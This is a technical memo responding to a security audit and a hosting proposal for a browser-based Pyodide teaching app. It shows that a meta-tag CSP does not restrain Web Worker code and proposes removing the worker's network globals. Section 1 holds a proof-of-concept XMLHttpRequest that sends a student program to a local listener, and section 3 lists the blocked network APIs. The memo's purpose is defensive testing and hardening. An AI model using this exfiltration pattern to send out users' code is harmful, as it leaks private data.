# Recommendation: response to the audit and the GitHub Pages proposal

**Date:** September 14, 2026
**In response to:** `AUDIT-REPORT.md` (Antigravity AI, Sept 13) and `GITHUB-PAGES-PROPOSAL.md` (Sept 13)
**Short answer:** Yes to GitHub Pages — but not the way the proposal describes it, and not before one small hardening pass.

---

## 1. The finding that reorders everything

Neither document contains this, and it decides the hosting question.

**A `<meta>` Content-Security-Policy does not apply to Web Workers.** The worker is
where student Python runs. So on GitHub Pages *as proposed*, the CSP would not
restrain student code at all.

I tested it rather than reasoning about it. A listener was run on a separate
port, and student Python attempted to reach it:

```python
import js
xhr = js.XMLHttpRequest.new()
xhr.open("GET", "http://127.0.0.1:8199/?leak=my-secret-program", False)
xhr.send()
```

| CSP delivered via | Same-origin request | Cross-origin request |
|---|---|---|
| **HTTP header** (Cloudflare model) | **arrived** at the app server | blocked — nothing reached the listener |
| **`<meta>` tag** (GitHub Pages model) | **arrived** at the app server | **arrived at the listener** |

The cross-origin request physically landed on a different server. That is not an
inference from a console message.

The proposal states: *"Browsers enforce `connect-src 'self'` from `<meta>` CSP
tags identically to HTTP response headers. Student code execution remains
technically restricted from initiating outbound network requests."* **That is
incorrect for this application**, because the code that matters runs in a worker,
and a worker's policy comes from its own response headers — which GitHub Pages
cannot set.

## 2. The audit's Finding 1 is real, and worse than the hosting question

Look at the first column of that table again. **Under the current production
setup on Cloudflare, same-origin exfiltration already works.** The request
arrived at the server with the student's program in the query string:

```
/?leak=my-secret-program
```

So `BRIEF.md`'s claim — *"No code, no output, and no drawing is ever transmitted
anywhere"* — is **not true today, on either host**. The audit is right to call
this out, and right to call it High Risk. It is the only finding in either
document that invalidates something we have told Technology Services.

## 3. The fix, which I have tested

Remove the network and storage globals from the worker after Pyodide has
finished booting. Roughly ten lines in `src/runner/worker.js`:

```js
// Everything Pyodide needs has already loaded by this point.
for (const name of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource',
                    'importScripts', 'indexedDB', 'caches', 'Request',
                    'Response', 'navigator']) {
  Object.defineProperty(self, name, {
    value: undefined, writable: false, configurable: false,
  });
}
```

Measured result:

| | same-origin | cross-origin |
|---|---|---|
| header CSP + sandbox | **blocked** (`AttributeError`) | **blocked** |
| meta CSP + sandbox | **blocked** (`AttributeError`) | **blocked** |

Nothing reached either server in any configuration. Every global removed
cleanly. **147 checks across phases 0, 1, 3 and 4 still pass** — Pyodide loads
its runtime and stdlib before this point and needs none of it afterwards, and
the app's own IndexedDB use is on the main thread, not in the worker.

This changes the shape of the decision:

> Once student Python cannot reach the network **at all**, the CSP becomes a
> second line of defence rather than the only one — and the host's ability to set
> headers stops being a security requirement.

That is what makes GitHub Pages viable. Not the proposal's argument, which is
wrong; this one, which is tested.

---

## 4. Assessment of the audit

Broadly sound and worth acting on. My scoring differs in two places.

| # | Audit finding | My view |
|---|---|---|
| 1 | Pyodide network escape | **Confirmed, critical.** Fix before any deploy. Evidence above. |
| 2 | `immutable` vendor caching | **Real.** Note it is a *Cloudflare-specific* problem: GitHub Pages does not set `immutable`, so switching hosts largely dissolves it. Version-stamp the paths anyway before the first Pyodide upgrade. |
| 3 | Cloudflare vendor/logging language | **Fair, and applies to GitHub too.** Any host logs IPs and URIs. The brief needs honest wording regardless of where it is deployed — the proposal is silent on this, which is a gap in it, not a point in its favour. |
| 4 | Shared-device storage | **Fair.** A "Clear all work on this computer" button in the Your Work panel is cheap and genuinely useful in a lab. |
| 5 | Deployment hygiene | **Fair.** See §5 — the proposed workflow does not actually fix it. |
| 6 | Unbounded decompression | **Real.** A crafted share link could balloon memory. Cap it at ~512 KB. Ten lines. |
| 7 | "Saved" shown without verifying the write | **Real, and I would raise this to High.** The audit rates it Medium. This project exists because students lost work in a tool that said it had saved. Telling a student "Saved" when the write failed is the exact failure mode we set out to eliminate, and it is currently cosmetic: `main.js` sets "Saved" on a 600 ms timer with no reference to whether `persist()` succeeded. |
| 8 | `frame-ancestors 'none'` | **Design decision, not a defect.** Worth noting it is unavailable on GitHub Pages anyway, since `<meta>` ignores `frame-ancestors`. |
| — | Batch size 128 vs spec's 256 | **Correct — my documentation error.** The code is right; `SPEC.md` §5 was not updated when the value changed in Phase 1. |
| — | 8-second runaway watchdog missing | **Correct.** Specified in §7c, never implemented. Low priority: Stop already works in ~30 ms and the UI does not freeze. |
| — | PNG width / transparency / cursor options not in the UI | **Correct.** The export functions take these; only the menu is missing. |

Two things the audit gets slightly wrong, worth noting for whoever reads it
next: it reports the repository as 66 files, which counts development files —
the *deployable* site is 33 files and 15 MB. And it did not run the browser
suites (183 of the 307 checks), so its "verification" section understates
coverage rather than overstating it.

## 5. Assessment of the GitHub Pages proposal

**Correct and verified:**

- Technical feasibility: `.wasm` MIME type, Web Workers, Service Worker, share
  links via fragment — all fine on GitHub Pages.
- **Subpath deployment works.** I checked: the only absolute paths in the source
  are `/opt/editor` inside Pyodide's *virtual* filesystem, which has nothing to
  do with URLs. Everything else is relative or `import.meta.url`.
- Cost, size and bandwidth: 15 MB against a 1 GB site limit and a 100 GB/month
  soft cap. Not close.
- **The CI/CD argument is the strongest thing in the document** and I agree with
  it. Drag-and-drop deployment is the weakest part of the current plan.

**Wrong:**

- The `<meta>` CSP security-equivalence claim (§1 above). This is the load-bearing
  claim of the whole proposal and it does not hold.

**Missing:**

- **GitHub Pages requires a public repository** on GitHub Free. Publishing this
  code publicly is probably fine — there are no secrets in it — but it is a
  decision someone should make deliberately, not discover.
- The proposed workflow uploads `path: '.'`, which publishes *everything*:
  tests, screenshots, `node_modules` if present, and the internal documents.
  That is precisely the hygiene problem the proposal criticises Cloudflare
  drag-and-drop for. It needs a `dist/` step.
- Host logging (audit Finding 3) applies identically to GitHub. Switching does
  not remove the vendor relationship, it changes which vendor.

---

## 6. Recommended next step

**One hardening pass, then deploy to GitHub Pages.** In that order — the
hardening is what makes the host choice safe to make on preference.

### Step 1 — harden (blocks deployment)

1. **Sandbox the worker.** Proven above. Add a test that asserts student Python
   cannot reach the network, so this can never silently regress.
2. **Make "Saved" honest.** `persist()` must check the write succeeded; the UI
   must say something different when it did not.
3. **Cap share-link decompression** at ~512 KB.
4. **Correct `BRIEF.md`.** Replace the absolute "never transmitted anywhere"
   with what will then be true and checkable: student code cannot reach the
   network because the runtime has no network primitives, and the host sees only
   ordinary static-file requests and their logs.

### Step 2 — deploy to GitHub Pages

5. **`build.mjs`** producing a `dist/` of exactly the 33 production files.
6. **GitHub Actions** workflow uploading `dist/`, not `.`.
7. **`<meta>` CSP in `index.html`**, and keep `_headers` — it costs nothing and
   means the policy travels if the site ever moves to a host that honours it.
8. **Extend `test/csp.test.mjs`** to check both, and to assert that the meta
   policy carries the directives that `<meta>` can actually enforce.

### Later — not blocking

9. Version-stamped vendor paths, before the first Pyodide upgrade.
10. "Clear all work on this computer" button.
11. The 8-second watchdog, PNG export options, and the `SPEC.md` batch-size fix.

### On the choice itself

After Step 1, GitHub Pages and Cloudflare Pages are close enough that
**familiarity should decide it, and you know GitHub.** The remaining difference
is that Cloudflare can set real headers and GitHub cannot, which is worth one
honest sentence in the brief rather than a change of plan. Cloudflare's
`_headers` file stays in the repository either way.

The automated deployment is a real gain over drag-and-drop, and for a tool that
has to survive years of occasional maintenance by one teacher, "push to main and
it deploys" is worth more than a header.
